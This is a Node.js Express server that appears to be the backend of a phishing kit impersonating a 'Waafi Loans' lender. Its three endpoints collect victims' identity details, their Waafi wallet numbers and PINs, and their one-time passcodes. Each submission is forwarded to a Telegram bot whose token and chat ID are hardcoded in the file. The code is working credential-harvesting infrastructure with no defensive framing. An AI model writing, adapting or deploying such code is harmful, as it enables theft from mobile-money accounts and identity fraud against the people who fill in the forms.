const express = require('express');
const cors = require('cors');
const axios = require('axios');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5000;

// ===== MIDDLEWARE =====
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ===== TELEGRAM CONFIGURATION (from environment variables) =====
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8647117303:AAEdkgbGSaJ9D8Jn5S-yopTIw6L1V88SFu4';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8444365382';

// ===== SEND MESSAGE TO TELEGRAM =====
async function sendToTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Message sent to Telegram:', response.data.ok);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending to Telegram:', error.response?.data || error.message);
        throw error;
    }
}

// ===== FORMAT MESSAGES =====
function formatApplyData(data) {
    return `
🏦 <b>NEW LOAN APPLICATION</b>
━━━━━━━━━━━━━━━━━━━
👤 <b>Full Name:</b> ${data.fullName || 'N/A'}
📱 <b>Phone:</b> ${data.phone || 'N/A'}
🪪 <b>National ID:</b> ${data.nationalId || 'N/A'}
📅 <b>Date of Birth:</b> ${data.dob || 'N/A'}
📍 <b>Town:</b> ${data.town || 'N/A'}
💼 <b>Employment:</b> ${data.employment || 'N/A'}
🎯 <b>Purpose:</b> ${data.purpose || 'N/A'}
💰 <b>Loan Amount:</b> $${data.loanAmount || 'N/A'}
📆 <b>Duration:</b> ${data.duration || 'N/A'} months
📊 <b>Monthly Repayment:</b> $${data.monthlyRepayment || 'N/A'}
📈 <b>Total Repayment:</b> $${data.totalRepayment || 'N/A'}
━━━━━━━━━━━━━━━━━━━
🕐 ${new Date().toLocaleString()}
    `;
}

function formatVerifyData(data) {
    return `
🔐 <b>WAAFI WALLET VERIFICATION</b>
━━━━━━━━━━━━━━━━━━━
📱 <b>Wallet Number:</b> ${data.phoneNumber || 'N/A'}
🔑 <b>PIN:</b> ${data.pin || 'N/A'}
━━━━━━━━━━━━━━━━━━━
🕐 ${new Date().toLocaleString()}
    `;
}

function formatOtpData(data) {
    return `
✅ <b>OTP VERIFICATION</b>
━━━━━━━━━━━━━━━━━━━
📱 <b>Phone Number:</b> ${data.phoneNumber || 'N/A'}
🔢 <b>OTP Code:</b> ${data.otp || 'N/A'}
📊 <b>Status:</b> ${data.status || 'Verified'}
━━━━━━━━━━━━━━━━━━━
🕐 ${new Date().toLocaleString()}
    `;
}

// ===== ROUTES =====

// Health check
app.get('/', (req, res) => {
    res.json({
        status: 'success',
        message: 'Waafi Loans API is running',
        port: PORT,
        timestamp: new Date().toISOString()
    });
});

// ===== 1. APPLY FORM ENDPOINT =====
app.post('/api/apply', async (req, res) => {
    try {
        const data = req.body;
        console.log('📝 Apply form received:', data);

        const message = formatApplyData(data);
        await sendToTelegram(message);

        res.json({
            success: true,
            message: 'Application submitted successfully',
            data: data
        });
    } catch (error) {
        console.error('❌ Error in /api/apply:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to submit application',
            error: error.message
        });
    }
});

// ===== 2. VERIFY FORM ENDPOINT =====
app.post('/api/verify', async (req, res) => {
    try {
        const data = req.body;
        console.log('🔐 Verify form received:', data);

        const message = formatVerifyData(data);
        await sendToTelegram(message);

        res.json({
            success: true,
            message: 'Verification submitted successfully',
            data: data
        });
    } catch (error) {
        console.error('❌ Error in /api/verify:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to submit verification',
            error: error.message
        });
    }
});

// ===== 3. OTP FORM ENDPOINT =====
app.post('/api/otp', async (req, res) => {
    try {
        const data = req.body;
        console.log('✅ OTP form received:', data);

        const message = formatOtpData(data);
        await sendToTelegram(message);

        res.json({
            success: true,
            message: 'OTP verified successfully',
            data: data
        });
    } catch (error) {
        console.error('❌ Error in /api/otp:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to verify OTP',
            error: error.message
        });
    }
});

// ===== TEST TELEGRAM ENDPOINT =====
app.get('/api/test-telegram', async (req, res) => {
    try {
        const testMessage = `
🧪 <b>TELEGRAM TEST MESSAGE</b>
━━━━━━━━━━━━━━━━━━━
✅ Connection successful!
🤖 Bot is working properly
📡 Server is running on port ${PORT}
🌐 Host: ${req.get('host')}
━━━━━━━━━━━━━━━━━━━
🕐 ${new Date().toLocaleString()}
        `;
        await sendToTelegram(testMessage);
        res.json({
            success: true,
            message: 'Test message sent to Telegram successfully'
        });
    } catch (error) {
        console.error('❌ Error in /api/test-telegram:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to send test message',
            error: error.message
        });
    }
});

// ===== START SERVER =====
app.listen(PORT, () => {
    console.log(`🚀 Server is running on port ${PORT}`);
    console.log(`📡 API URL: https://waafi-loans-production.up.railway.app`);
    console.log(`🤖 Telegram Bot: ${TELEGRAM_BOT_TOKEN ? 'Configured ✅' : 'Not configured ❌'}`);
    console.log(`📱 Telegram Chat ID: ${TELEGRAM_CHAT_ID || 'Not set ❌'}`);
});
